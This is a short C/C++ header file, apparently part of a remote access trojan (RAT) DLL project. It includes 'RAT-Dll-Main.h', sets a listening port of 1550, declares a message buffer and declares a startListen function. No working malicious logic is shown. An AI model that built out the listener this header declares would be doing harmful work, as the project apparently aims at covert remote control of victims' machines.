#pragma once // Preprocessor directive - current source file to be included only once during compilation (same as header guards)

#include "RAT-Dll-Main.h"

#define DEFAULT_BUF_LEN 512
extern int PORT_NUM = 1550;

char msgBuf[256];

INT startListen();
